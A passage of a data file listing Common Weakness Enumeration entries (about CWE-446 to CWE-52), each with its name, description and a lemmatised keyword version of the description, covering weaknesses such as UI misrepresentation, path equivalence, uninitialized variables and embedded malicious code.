interpret set message intermediary interpret sequence byte different set message example discrepancy arise handle duplicate header like transfer encoding te content length cl malicious http message different header te inconsistent parsing interpretation message allow adversary smuggle message client server intermediary aware weakness usually result usage outdated incompatible http protocol version http agent
CWE-446,UI Discrepancy for Security Feature,"The user interface does not correctly enable or configure a security feature, but the interface provides feedback that causes the user to believe that the feature is in a secure state.When the user interface does not properly reflect what the user asks of it, then it can lead the user into a false sense of security. For example, the user might check a box to enable a security option to enable encrypted communications, but the product does not actually enable the encryption. Alternately, the user might provide a ""restrict ALL"" access control rule, but the product only implements ""restrict SOME"".",user interface correctly enable configure security feature interface provide feedback cause user believe feature secure state user interface properly reflect user ask lead user false sense security example user check box enable security option enable encrypt communication product actually enable encryption alternately user provide restrict access control rule product implement restrict
CWE-447,Unimplemented or Unsupported Feature in UI,"A UI function for a security feature appears to be supported and gives feedback to the user that suggests that it is supported, but the underlying functionality is not implemented.",ui function security feature appear support give feedback user suggest support underlie functionality implement
CWE-448,Obsolete Feature in UI,A UI function is obsolete and the product does not warn the user.,ui function obsolete product warn user
CWE-449,The UI Performs the Wrong Action,The UI performs the wrong action with respect to the user's request.,ui perform wrong action respect user request
CWE-45,Path Equivalence: 'file...name' (Multiple Internal Dot),"The product accepts path input in the form of multiple internal dot ('file...dir') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.",product accept path input form multiple internal dot file dir appropriate validation lead ambiguous path resolution allow attacker traverse file system unintended location access arbitrary file
CWE-450,Multiple Interpretations of UI Input,The UI has multiple interpretations of user input but does not prompt the user when it selects the less secure interpretation.,ui multiple interpretation user input prompt user select secure interpretation
CWE-451,User Interface (UI) Misrepresentation of Critical Information,"The user interface (UI) does not properly represent critical information to the user, allowing the information - or its source - to be obscured or spoofed. This is often a component in phishing attacks.If an attacker can cause the UI to display erroneous data, or to otherwise convince the user to display information that appears to come from a trusted source, then the attacker could trick the user into performing the wrong action. This is often a component in phishing attacks, but other kinds of problems exist. For example, if the UI is used to monitor the security state of a system or network, then omitting or obscuring an important indicator could prevent the user from detecting and reacting to a security-critical event.UI misrepresentation can take many forms:Incorrect indicator: incorrect information is displayed, which prevents the user from understanding the true state of the product or the environment the product is monitoring, especially of potentially-dangerous conditions or operations. This can be broken down into several different subtypes.Overlay: an area of the display is intended to give critical information, but another process can modify the display by overlaying another element on top of it. The user is not interacting with the expected portion of the user interface. This is the problem that enables clickjacking attacks, although many other types of attacks exist that involve overlay.Icon manipulation: the wrong icon, or the wrong color indicator, can be influenced (such as making a dangerous .EXE executable look like a harmless .GIF)Timing: the product is performing a state transition or context switch that is presented to the user with an indicator, but a race condition can cause the wrong indicator to be used before the product has fully switched context. The race window could be extended indefinitely if the attacker can trigger an error.Visual truncation: important information could be truncated from the display, such as a long filename with a dangerous extension that is not displayed in the GUI because the malicious portion is truncated. The use of excessive whitespace can also cause truncation, or place the potentially-dangerous indicator outside of the user's field of view (e.g. ""filename.txt .exe""). A different type of truncation can occur when a portion of the information is removed due to reasons other than length, such as the accidental insertion of an end-of-input marker in the middle of an input, such as a NUL byte in a C-style string.Visual distinction: visual information might be presented in a way that makes it difficult for the user to quickly and correctly distinguish between critical and unimportant segments of the display.Homographs: letters from different character sets, fonts, or languages can appear very similar (i.e. may be visually equivalent) in a way that causes the human user to misread the text (for example, to conduct phishing attacks to trick a user into visiting a malicious web site with a visually-similar name as a trusted site). This can be regarded as a type of visual distinction issue.",user interface ui properly represent critical information user allow information source obscure spoof component phishing attack attacker cause ui display erroneous datum convince user display information appear come trust source attacker trick user perform wrong action component phishing attack kind problem exist example ui monitor security state system network omit obscure important indicator prevent user detect react security critical event ui misrepresentation form incorrect indicator incorrect information display prevent user understand true state product environment product monitor especially potentially dangerous condition operation break different subtype overlay area display intend critical information process modify display overlay element user interact expected portion user interface problem enable clickjacking attack type attack exist involve overlay icon manipulation wrong icon wrong color indicator influence make dangerous executable look like harmless product perform state transition context switch present user indicator race condition cause wrong indicator product fully switch context race window extend indefinitely attacker trigger error visual truncation important information truncate display long filename dangerous extension display gui malicious portion truncate use excessive whitespace cause truncation place potentially dangerous indicator outside user field view different type truncation occur portion information remove reason length accidental insertion end input marker middle input nul byte c style string visual distinction visual information present way make difficult user quickly correctly distinguish critical unimportant segment display homograph letter different character set font language appear similar visually equivalent way cause human user misread text example conduct phishing attack trick user visit malicious web site visually similar trust site regard type visual distinction issue
CWE-453,Insecure Default Variable Initialization,"The product, by default, initializes an internal variable with an insecure or less secure value than is possible.",product default initialize internal variable insecure secure value possible
CWE-454,External Initialization of Trusted Variables or Data Stores,"The product initializes critical internal variables or data stores using inputs that can be modified by untrusted actors.A product system should be reluctant to trust variables that have been initialized outside of its trust boundary, especially if they are initialized by users. The variables may have been initialized incorrectly. If an attacker can initialize the variable, then they can influence what the vulnerable system will do.",product initialize critical internal variable datum store input modify untrusted actor product system reluctant trust variable initialize outside trust boundary especially initialize user variable initialize incorrectly attacker initialize variable influence vulnerable system
CWE-455,Non-exit on Failed Initialization,"The product does not exit or otherwise modify its operation when security-relevant errors occur during initialization, such as when a configuration file has a format error or a hardware security module (HSM) cannot be activated, which can cause the product to execute in a less secure fashion than intended by the administrator.",product exit modify operation security relevant error occur initialization configuration file format error hardware security module hsm activate cause product execute secure fashion intend administrator
CWE-456,Missing Initialization of a Variable,"The product does not initialize critical variables, which causes the execution environment to use unexpected values.",product initialize critical variable cause execution environment use unexpected value
CWE-457,Use of Uninitialized Variable,"The code uses a variable that has not been initialized, leading to unpredictable or unintended results.In some languages such as C and C++, stack variables are not initialized by default. They generally contain junk data with the contents of stack memory before the function was invoked. An attacker can sometimes control or read these contents. In other languages or conditions, a variable that is not explicitly initialized can be given a default value that has security implications, depending on the logic of the program. The presence of an uninitialized variable can sometimes indicate a typographic error in the code.",code use variable initialize lead unpredictable unintended result language c stack variable initialize default generally contain junk datum content stack memory function invoke attacker control read content language condition variable explicitly initialize give default value security implication depend logic program presence uninitialized variable indicate typographic error code
CWE-458,DEPRECATED: Incorrect Initialization,"This weakness has been deprecated because its name and description did not match. The description duplicated CWE-454, while the name suggested a more abstract initialization problem. Please refer to CWE-665 for the more abstract problem.",weakness deprecate description match description duplicate suggest abstract initialization problem refer abstract problem
CWE-459,Incomplete Cleanup,"The product does not properly ""clean up"" and remove temporary or supporting resources after they have been used.",product properly clean remove temporary supporting resource
CWE-46,Path Equivalence: 'filename ' (Trailing Space),"The product accepts path input in the form of trailing space ('filedir ') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.",product accept path input form trail space filedir appropriate validation lead ambiguous path resolution allow attacker traverse file system unintended location access arbitrary file
CWE-460,Improper Cleanup on Thrown Exception,"The product does not clean up its state or incorrectly cleans up its state when an exception is thrown, leading to unexpected state or control flow.Often, when functions or loops become complicated, some level of resource cleanup is needed throughout execution. Exceptions can disturb the flow of the code and prevent the necessary cleanup from happening.",product clean state incorrectly clean state exception throw lead unexpected state control flow function loop complicated level resource cleanup need execution exception disturb flow code prevent necessary cleanup happen
CWE-462,Duplicate Key in Associative List (Alist),"Duplicate keys in associative lists can lead to non-unique keys being mistaken for an error.A duplicate key entry -- if the alist is designed properly -- could be used as a constant time replace function. However, duplicate key entries could be inserted by mistake. Because of this ambiguity, duplicate key entries in an association list are not recommended and should not be allowed.",duplicate key associative list lead non unique key mistake error duplicate key entry alist design properly constant time replace function duplicate key entry insert mistake ambiguity duplicate key entry association list recommend allow
CWE-463,Deletion of Data Structure Sentinel,"The accidental deletion of a data-structure sentinel can cause serious programming logic problems.Often times data-structure sentinels are used to mark structure of the data structure. A common example of this is the null character at the end of strings. Another common example is linked lists which may contain a sentinel to mark the end of the list. It is dangerous to allow this type of control data to be easily accessible. Therefore, it is important to protect from the deletion or modification outside of some wrapper interface which provides safety.",accidental deletion data structure sentinel cause programming logic problem time data structure sentinel mark structure data structure common example null character end string common example link list contain sentinel mark end list dangerous allow type control datum easily accessible important protect deletion modification outside wrapper interface provide safety
CWE-464,Addition of Data Structure Sentinel,"The accidental addition of a data-structure sentinel can cause serious programming logic problems.Data-structure sentinels are often used to mark the structure of data. A common example of this is the null character at the end of strings or a special sentinel to mark the end of a linked list. It is dangerous to allow this type of control data to be easily accessible. Therefore, it is important to protect from the addition or modification of sentinels.",accidental addition data structure sentinel cause programming logic problem data structure sentinel mark structure datum common example null character end string special sentinel mark end link list dangerous allow type control datum easily accessible important protect addition modification sentinel
CWE-466,Return of Pointer Value Outside of Expected Range,A function can return a pointer to memory that is outside of the buffer that the pointer is expected to reference.,function return pointer memory outside buffer pointer expect reference
CWE-467,Use of sizeof() on a Pointer Type,"The code calls sizeof() on a malloced pointer type, which always returns the wordsize/8. This can produce an unexpected result if the programmer intended to determine how much memory has been allocated.The use of sizeof() on a pointer can sometimes generate useful information. An obvious case is to find out the wordsize on a platform. More often than not, the appearance of sizeof(pointer) indicates a bug.",code call sizeof malloce pointer type return produce unexpected result programmer intend determine memory allocate use sizeof pointer generate useful information obvious case find wordsize platform appearance indicate bug
CWE-468,Incorrect Pointer Scaling,"In C and C++, one may often accidentally refer to the wrong memory due to the semantics of when math operations are implicitly scaled.",c accidentally refer wrong memory semantic math operation implicitly scale
CWE-469,Use of Pointer Subtraction to Determine Size,"The product subtracts one pointer from another in order to determine size, but this calculation can be incorrect if the pointers do not exist in the same memory chunk.",product subtract pointer order determine size calculation incorrect pointer exist memory chunk
CWE-47,Path Equivalence: ' filename' (Leading Space),"The product accepts path input in the form of leading space (' filedir') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.",product accept path input form leading space filedir appropriate validation lead ambiguous path resolution allow attacker traverse file system unintended location access arbitrary file
CWE-470,Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection'),"The product uses external input with reflection to select which classes or code to use, but it does not sufficiently prevent the input from selecting improper classes or code.If the product uses external inputs to determine which class to instantiate or which method to invoke, then an attacker could supply values to select unexpected classes or methods. If this occurs, then the attacker could create control flow paths that were not intended by the developer. These paths could bypass authentication or access control checks, or otherwise cause the product to behave in an unexpected manner. This situation becomes a doomsday scenario if the attacker can upload files into a location that appears on the product's classpath (CWE-427) or add new entries to the product's classpath (CWE-426). Under either of these conditions, the attacker can use reflection to introduce new, malicious behavior into the product.",product use external input reflection select class code use sufficiently prevent input select improper class code product use external input determine class instantiate method invoke attacker supply value select unexpected class method occur attacker create control flow path intend developer path bypass authentication access control check cause product behave unexpected manner situation doomsday scenario attacker upload file location appear product classpath add new entry product classpath condition attacker use reflection introduce new malicious behavior product
CWE-471,Modification of Assumed-Immutable Data (MAID),"The product does not properly protect an assumed-immutable element from being modified by an attacker.This occurs when a particular input is critical enough to the functioning of the application that it should not be modifiable at all, but it is. Certain resources are often assumed to be immutable when they are not, such as hidden form fields in web applications, cookies, and reverse DNS lookups.",product properly protect assume immutable element modify attacker occur particular input critical functioning application modifiable certain resource assume immutable hidden form field web application cookie reverse dns lookup
CWE-472,External Control of Assumed-Immutable Web Parameter,"The web application does not sufficiently verify inputs that are assumed to be immutable but are actually externally controllable, such as hidden form fields.If a web product does not properly protect assumed-immutable values from modification in hidden form fields, parameters, cookies, or URLs, this can lead to modification of critical data. Web applications often mistakenly make the assumption that data passed to the client in hidden fields or cookies is not susceptible to tampering. Improper validation of data that are user-controllable can lead to the application processing incorrect, and often malicious, input.For example, custom cookies commonly store session data or persistent data across sessions. This kind of session data is normally involved in security related decisions on the server side, such as user authentication and access control. Thus, the cookies might contain sensitive data such as user credentials and privileges. This is a dangerous practice, as it can often lead to improper reliance on the value of the client-provided cookie by the server side application.",web application sufficiently verify input assume immutable actually externally controllable hidden form field web product properly protect assume immutable value modification hidden form field parameter cookie url lead modification critical datum web application mistakenly assumption datum pass client hidden field cookie susceptible tamper improper validation datum user controllable lead application process incorrect malicious input example custom cookie commonly store session datum persistent datum session kind session datum normally involve security relate decision server user authentication access control cookie contain sensitive datum user credential privilege dangerous practice lead improper reliance value client provide cookie server application
CWE-473,PHP External Variable Modification,"A PHP application does not properly protect against the modification of variables from external sources, such as query parameters or cookies. This can expose the application to numerous weaknesses that would not exist otherwise.",php application properly protect modification variable external source query parameter cookie expose application numerous weakness exist
CWE-474,Use of Function with Inconsistent Implementations,"The code uses a function that has inconsistent implementations across operating systems and versions.The use of inconsistent implementations can cause changes in behavior when the code is ported or built under a different environment than the programmer expects, which can lead to security problems in some cases.The implementation of many functions varies by platform, and at times, even by different versions of the same platform. Implementation differences can include:Slight differences in the way parameters are interpreted leading to inconsistent results.Some implementations of the function carry significant security risks.The function might not be defined on all platforms.The function might change which return codes it can provide, or change the meaning of its return codes.",code use function inconsistent implementation operate system version use inconsistent implementation cause change behavior code port build different environment programmer expect lead security problem case implementation function vary platform time different version platform implementation difference include slight difference way parameter interpret lead inconsistent result implementation function carry significant security risk function define platform function change return code provide change meaning return code
CWE-475,Undefined Behavior for Input to API,The behavior of this function is undefined unless its control parameter is set to a specific value.,behavior function undefined control parameter set specific value
CWE-476,NULL Pointer Dereference,"A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.NULL pointer dereference issues can occur through a number of flaws, including race conditions, and simple programming omissions.",null pointer dereference occur application dereference pointer expect valid null typically cause crash exit null pointer dereference issue occur number flaw include race condition simple programming omission
CWE-477,Use of Obsolete Function,"The code uses deprecated or obsolete functions, which suggests that the code has not been actively reviewed or maintained.As programming languages evolve, functions occasionally become obsolete due to:Advances in the languageImproved understanding of how operations should be performed effectively and securelyChanges in the conventions that govern certain operationsFunctions that are removed are usually replaced by newer counterparts that perform the same task in some different and hopefully improved way.",code use deprecated obsolete function suggest code actively review maintain programming language evolve function occasionally obsolete advance languageimproved understanding operation perform effectively securelychange convention govern certain operationsfunction remove usually replace new counterpart perform task different hopefully improved way
CWE-478,Missing Default Case in Multiple Condition Expression,"The code does not have a default case in an expression with multiple conditions, such as a switch statement.If a multiple-condition expression (such as a switch in C) omits the default case but does not consider or handle all possible values that could occur, then this might lead to complex logical errors and resultant weaknesses. Because of this, further decisions are made based on poor information, and cascading failure results. This cascading failure may result in any number of security issues, and constitutes a significant failure in the system.",code default case expression multiple condition switch statement multiple condition expression switch c omit default case consider handle possible value occur lead complex logical error resultant weakness decision base poor information cascade failure result cascade failure result number security issue constitute significant failure system
CWE-479,Signal Handler Use of a Non-reentrant Function,"The product defines a signal handler that calls a non-reentrant function.Non-reentrant functions are functions that cannot safely be called, interrupted, and then recalled before the first call has finished without resulting in memory corruption. This can lead to an unexpected system state and unpredictable results with a variety of potential consequences depending on context, including denial of service and code execution.Many functions are not reentrant, but some of them can result in the corruption of memory if they are used in a signal handler. The function call syslog() is an example of this. In order to perform its functionality, it allocates a small amount of memory as ""scratch space."" If syslog() is suspended by a signal call and the signal handler calls syslog(), the memory used by both of these functions enters an undefined, and possibly, exploitable state. Implementations of malloc() and free() manage metadata in global structures in order to track which memory is allocated versus which memory is available, but they are non-reentrant. Simultaneous calls to these functions can cause corruption of the metadata.",product define signal handler call non reentrant function non reentrant function function safely call interrupt recall finish result memory corruption lead unexpected system state unpredictable result variety potential consequence depend context include denial service code execution function reentrant result corruption memory signal handler function syslog example order perform functionality allocate small memory scratch space syslog suspend signal signal handler call syslog memory function enter undefined possibly exploitable state implementation malloc free manage metadata global structure order track memory allocate versus memory available non reentrant simultaneous call function cause corruption metadata
CWE-48,Path Equivalence: 'file name' (Internal Whitespace),"The product accepts path input in the form of internal space ('file(SPACE)name') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.",product accept path input form internal space appropriate validation lead ambiguous path resolution allow attacker traverse file system unintended location access arbitrary file
CWE-480,Use of Incorrect Operator,"The product accidentally uses the wrong operator, which changes the logic in security-relevant ways.These types of errors are generally the result of a typo by the programmer.",product accidentally use wrong operator change logic security relevant way type error generally result typo programmer
CWE-481,Assigning instead of Comparing,"The code uses an operator for assignment when the intention was to perform a comparison.In many languages the compare statement is very close in appearance to the assignment statement and are often confused. This bug is generally the result of a typo and usually causes obvious problems with program execution. If the comparison is in an if statement, the if statement will usually evaluate the value of the right-hand side of the predicate.",code use operator assignment intention perform comparison language compare statement close appearance assignment statement confuse bug generally result typo usually cause obvious problem program execution comparison statement statement usually evaluate value right hand predicate
CWE-482,Comparing instead of Assigning,"The code uses an operator for comparison when the intention was to perform an assignment.In many languages, the compare statement is very close in appearance to the assignment statement; they are often confused.",code use operator comparison intention perform assignment language compare statement close appearance assignment statement confused
CWE-483,Incorrect Block Delimitation,"The code does not explicitly delimit a block that is intended to contain 2 or more statements, creating a logic error.In some languages, braces (or other delimiters) are optional for blocks. When the delimiter is omitted, it is possible to insert a logic error in which a statement is thought to be in a block but is not. In some cases, the logic error can have security implications.",code explicitly delimit block intend contain statement create logic error language brace delimiter optional block delimiter omit possible insert logic error statement think block case logic error security implication
CWE-484,Omitted Break Statement in Switch,"The product omits a break statement within a switch or similar construct, causing code associated with multiple conditions to execute. This can cause problems when the programmer only intended to execute code associated with one condition.This can lead to critical code executing in situations where it should not.",product omit break statement switch similar construct cause code associate multiple condition execute cause problem programmer intend execute code associate condition lead critical code execute situation
CWE-486,Comparison of Classes by Name,"The product compares classes by name, which can cause it to use the wrong class when multiple classes can have the same name.If the decision to trust the methods and data of an object is based on the name of a class, it is possible for malicious users to send objects of the same name as trusted classes and thereby gain the trust afforded to known classes and types.",product compare class cause use wrong class multiple class decision trust method datum object base class possible malicious user send object trust class gain trust afford know class type
CWE-487,Reliance on Package-level Scope,"Java packages are not inherently closed; therefore, relying on them for code security is not a good practice.The purpose of package scope is to prevent accidental access by other parts of a program. This is an ease-of-software-development feature but not a security feature.",java package inherently closed rely code security good practice purpose package scope prevent accidental access part program ease software development feature security feature
CWE-488,Exposure of Data Element to Wrong Session,"The product does not sufficiently enforce boundaries between the states of different sessions, causing data to be provided to, or used by, the wrong session.Data can ""bleed"" from one session to another through member variables of singleton objects, such as Servlets, and objects from a shared pool.In the case of Servlets, developers sometimes do not understand that, unless a Servlet implements the SingleThreadModel interface, the Servlet is a singleton; there is only one instance of the Servlet, and that single instance is used and re-used to handle multiple requests that are processed simultaneously by different threads. A common result is that developers use Servlet member fields in such a way that one user may inadvertently see another user's data. In other words, storing user data in Servlet member fields introduces a data access race condition.",product sufficiently enforce boundary state different session cause datum provide wrong session datum bleed session member variable singleton object servlets object share pool case servlets developer understand servlet implement singlethreadmodel interface servlet singleton instance servlet single instance handle multiple request process simultaneously different thread common result developer use servlet member field way user inadvertently user datum word store user datum servlet member field introduce datum access race condition
CWE-489,Active Debug Code,"The product is deployed to unauthorized actors with debugging code still enabled or active, which can create unintended entry points or expose sensitive information.A common development practice is to add ""back door"" code specifically designed for debugging or testing purposes that is not intended to be shipped or deployed with the product. These back door entry points create security risks because they are not considered during design or testing and fall outside of the expected operating conditions of the product.",product deploy unauthorized actor debug code enable active create unintended entry point expose sensitive information common development practice add door code specifically design debugging testing purpose intend ship deploy product door entry point create security risk consider design testing fall outside expect operating condition product
CWE-49,Path Equivalence: 'filename/' (Trailing Slash),"The product accepts path input in the form of trailing slash ('filedir/') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.",product accept path input form trail slash appropriate validation lead ambiguous path resolution allow attacker traverse file system unintended location access arbitrary file
CWE-491,Public cloneable() Method Without Final ('Object Hijack'),"A class has a cloneable() method that is not declared final, which allows an object to be created without calling the constructor. This can cause the object to be in an unexpected state.",class cloneable method declare final allow object create call constructor cause object unexpected state
CWE-492,Use of Inner Class Containing Sensitive Data,"Inner classes are translated into classes that are accessible at package scope and may expose code that the programmer intended to keep private to attackers.Inner classes quietly introduce several security concerns because of the way they are translated into Java bytecode. In Java source code, it appears that an inner class can be declared to be accessible only by the enclosing class, but Java bytecode has no concept of an inner class, so the compiler must transform an inner class declaration into a peer class with package level access to the original outer class. More insidiously, since an inner class can access private fields in its enclosing class, once an inner class becomes a peer class in bytecode, the compiler converts private fields accessed by the inner class into protected fields.",inner class translate class accessible package scope expose code programmer intend private attacker inner class quietly introduce security concern way translate java bytecode java source code appear inner class declare accessible enclose class java bytecode concept inner class compiler transform inner class declaration peer class package level access original outer class insidiously inner class access private field enclose class inner class peer class bytecode compiler convert private field access inner class protect field
CWE-493,Critical Public Variable Without Final Modifier,"The product has a critical public variable that is not final, which allows the variable to be modified to contain unexpected values.If a field is non-final and public, it can be changed once the value is set by any function that has access to the class which contains the field. This could lead to a vulnerability if other parts of the program make assumptions about the contents of that field.",product critical public variable final allow variable modify contain unexpected value field non final public change value set function access class contain field lead vulnerability part program assumption content field
CWE-494,Download of Code Without Integrity Check,"The product downloads source code or an executable from a remote location and executes the code without sufficiently verifying the origin and integrity of the code.An attacker can execute malicious code by compromising the host server, performing DNS spoofing, or modifying the code in transit.",product download source code executable remote location execute code sufficiently verify origin integrity code attacker execute malicious code compromise host server perform dns spoofing modify code transit
CWE-495,Private Data Structure Returned From A Public Method,"The product has a method that is declared public, but returns a reference to a private data structure, which could then be modified in unexpected ways.",product method declare public return reference private data structure modify unexpected way
CWE-496,Public Data Assigned to Private Array-Typed Field,Assigning public data to a private array is equivalent to giving public access to the array.,assign public datum private array equivalent give public access array
CWE-497,Exposure of Sensitive System Information to an Unauthorized Control Sphere,"The product does not properly prevent sensitive system-level information from being accessed by unauthorized actors who do not have the same level of access to the underlying system as the product does.Network-based products, such as web applications, often run on top of an operating system or similar environment. When the product communicates with outside parties, details about the underlying system are expected to remain hidden, such as path names for data files, other OS users, installed packages, the application environment, etc. This system information may be provided by the product itself, or buried within diagnostic or debugging messages. Debugging information helps an adversary learn about the system and form an attack plan.An information exposure occurs when system data or debugging information leaves the program through an output stream or logging function that makes it accessible to unauthorized parties. Using other weaknesses, an attacker could cause errors to occur; the response to these errors can reveal detailed system information, along with other impacts. An attacker can use messages that reveal technologies, operating systems, and product versions to tune the attack against known vulnerabilities in these technologies. A product may use diagnostic methods that provide significant implementation details such as stack traces as part of its error handling mechanism.",product properly prevent sensitive system level information access unauthorized actor level access underlie system product network base product web application run operate system similar environment product communicate outside party detail underlie system expect remain hidden path name data file os user instal package application environment etc system information provide product bury diagnostic debugging message debug information help adversary learn system form attack plan information exposure occur system datum debugging information leave program output stream logging function make accessible unauthorized party weakness attacker cause error occur response error reveal detailed system information impact attacker use message reveal technology operating system product version tune attack know vulnerability technology product use diagnostic method provide significant implementation detail stack trace error handling mechanism
CWE-498,Cloneable Class Containing Sensitive Information,"The code contains a class with sensitive data, but the class is cloneable. The data can then be accessed by cloning the class.Cloneable classes are effectively open classes, since data cannot be hidden in them. Classes that do not explicitly deny cloning can be cloned by any other class without running the constructor.",code contain class sensitive datum class cloneable datum access clone class cloneable class effectively open class datum hide class explicitly deny cloning clone class run constructor
CWE-499,Serializable Class Containing Sensitive Data,"The code contains a class with sensitive data, but the class does not explicitly deny serialization. The data can be accessed by serializing the class through another class.Serializable classes are effectively open classes since data cannot be hidden in them. Classes that do not explicitly deny serialization can be serialized by any other class, which can then in turn use the data stored inside it.",code contain class sensitive datum class explicitly deny serialization datum access serialize class class serializable class effectively open class datum hide class explicitly deny serialization serialize class turn use datum store inside
CWE-5,J2EE Misconfiguration: Data Transmission Without Encryption,Information sent over a network can be compromised while in transit. An attacker may be able to read or modify the contents if the data are sent in plaintext or are weakly encrypted.,information send network compromise transit attacker able read modify content datum send plaintext weakly encrypt
CWE-50,Path Equivalence: '//multiple/leading/slash',"The product accepts path input in the form of multiple leading slash ('//multiple/leading/slash') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.",product accept path input form multiple lead slash leading slash appropriate validation lead ambiguous path resolution allow attacker traverse file system unintended location access arbitrary file
CWE-500,Public Static Field Not Marked Final,"An object contains a public static field that is not marked final, which might allow it to be modified in unexpected ways.Public static variables can be read without an accessor and changed without a mutator by any classes in the application.",object contain public static field mark final allow modify unexpected way public static variable read accessor change mutator class application
CWE-501,Trust Boundary Violation,"The product mixes trusted and untrusted data in the same data structure or structured message.A trust boundary can be thought of as line drawn through a program. On one side of the line, data is untrusted. On the other side of the line, data is assumed to be trustworthy. The purpose of validation logic is to allow data to safely cross the trust boundary - to move from untrusted to trusted. A trust boundary violation occurs when a program blurs the line between what is trusted and what is untrusted. By combining trusted and untrusted data in the same data structure, it becomes easier for programmers to mistakenly trust unvalidated data.",product mix trusted untrusted datum data structure structured message trust boundary think line draw program line data untrusted line data assume trustworthy purpose validation logic allow datum safely cross trust boundary untrusted trusted trust boundary violation occur program blur line trust untrusted combine trusted untrusted datum data structure easy programmer mistakenly trust unvalidated datum
CWE-502,Deserialization of Untrusted Data,"The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.It is often convenient to serialize objects for communication or to save them for later use. However, deserialized data or code can often be modified without using the provided accessor functions if it does not use cryptography to protect itself. Furthermore, any cryptography would still be client-side security -- which is a dangerous security assumption.Data that is untrusted can not be trusted to be well-formed.When developers place no restrictions on ""gadget chains,"" or series of instances and method invocations that can self-execute during the deserialization process (i.e., before the object is returned to the caller), it is sometimes possible for attackers to leverage them to perform unauthorized actions, like generating a shell.",product deserialize untrusted datum sufficiently verify result datum valid convenient serialize object communication save later use deserialize datum code modify provide accessor function use cryptography protect furthermore cryptography client security dangerous security assumption data untrusted trust form developer place restriction gadget chain serie instance method invocation self execute deserialization process object return caller possible attacker leverage perform unauthorized action like generate shell
CWE-506,Embedded Malicious Code,"The product contains code that appears to be malicious in nature.Malicious flaws have acquired colorful names, including Trojan horse, trapdoor, timebomb, and logic-bomb. A developer might insert malicious code with the intent to subvert the security of a product or its host system at some time in the future. It generally refers to a program that performs a useful service but exploits rights of the program's user in a way the user does not intend.",product contain code appear malicious nature malicious flaw acquire colorful name include trojan horse trapdoor timebomb logic bomb developer insert malicious code intent subvert security product host system time future generally refer program perform useful service exploit right program user way user intend
CWE-507,Trojan Horse,"The product appears to contain benign or useful functionality, but it also contains code that is hidden from normal operation that violates the intended security policy of the user or the system administrator.",product appear contain benign useful functionality contain code hide normal operation violate intended security policy user system administrator
CWE-508,Non-Replicating Malicious Code,Non-replicating malicious code only resides on the target system or product that is attacked; it does not attempt to spread to other systems.,non replicate malicious code reside target system product attack attempt spread system
CWE-509,Replicating Malicious Code (Virus or Worm),"Replicating malicious code, including viruses and worms, will attempt to attack other systems once it has successfully compromised the target system or the product.",replicate malicious code include virus worm attempt attack system successfully compromise target system product
CWE-51,Path Equivalence: '/multiple//internal/slash',"The product accepts path input in the form of multiple internal slash ('/multiple//internal/slash/') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.",product accept path input form multiple internal slash appropriate validation lead ambiguous path resolution allow attacker traverse file system unintended location access arbitrary file
CWE-510,Trapdoor,"A trapdoor is a hidden piece of code that responds to a special input, allowing its user access to resources without passing through the normal security enforcement mechanism.",trapdoor hide piece code respond special input allow user access resource pass normal security enforcement mechanism
CWE-511,Logic/Time Bomb,"The product contains code that is designed to disrupt the legitimate operation of the product (or its environment) when a certain time passes, or when a certain logical condition is met.When the time bomb or logic bomb is detonated, it may perform a denial of service such as crashing the system, deleting critical data, or degrading system response time. This bomb might be placed within either a replicating or non-replicating Trojan horse.",product contain code design disrupt legitimate operation product environment certain time pass certain logical condition meet time bomb logic bomb detonate perform denial service crash system delete critical datum degrade system response time bomb place replicate non replicating trojan horse
CWE-512,Spyware,"The product collects personally identifiable information about a human user or the user's activities, but the product accesses this information using other resources besides itself, and it does not require that user's explicit approval or direct input into the product.""Spyware"" is a commonly used term with many definitions and interpretations. In general, it is meant to refer to products that collect information or install functionality that human users might not allow if they were fully aware of the actions being taken by the software. For example, a user might expect that tax software would collect a social security number and include it when filing a tax return, but that same user would not expect gaming software to obtain the social security number from that tax software's data.",product collect personally identifiable information human user user activity product access information resource require user explicit approval direct input product commonly term definition interpretation general mean refer product collect information install functionality human user allow fully aware action take software example user expect tax software collect social security number include file tax return user expect gaming software obtain social security number tax software data
CWE-514,Covert Channel,A covert channel is a path that can be used to transfer information in a way not intended by the system's designers.Typically the system has not given authorization for the transmission and has no knowledge of its occurrence.,covert channel path transfer information way intend system designer typically system give authorization transmission knowledge occurrence
CWE-515,Covert Storage Channel,"A covert storage channel transfers information through the setting of bits by one program and the reading of those bits by another. What distinguishes this case from that of ordinary operation is that the bits are used to convey encoded information.Covert storage channels occur when out-of-band data is stored in messages for the purpose of memory reuse. Covert channels are frequently classified as either storage or timing channels. Examples would include using a file intended to hold only audit information to convey user passwords--using the name of a file or perhaps status bits associated with it that can be read by all users to signal the contents of the file. Steganography, concealing information in such a manner that no one but the intended recipient knows of the existence of the message, is a good example of a covert storage channel.",covert storage channel transfer information setting bit program reading bit distinguish case ordinary operation bit convey encode information covert storage channel occur band datum store message purpose memory reuse covert channel frequently classify storage timing channel example include file intend hold audit information convey user password file status bit associate read user signal content file steganography conceal information manner intend recipient know existence message good example covert storage channel
CWE-516,DEPRECATED: Covert Timing Channel,This weakness can be found at CWE-385.,weakness find
CWE-52,Path Equivalence: '/multiple/trailing/slash//',"The product accepts path input in the form of multiple trailing slash ('/multiple/trailing/slash//') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.",product accept path input form multiple trail slash trailing appropriate validation lead ambiguous path resolution allow attacker traverse file system unintended location access arbitrary file
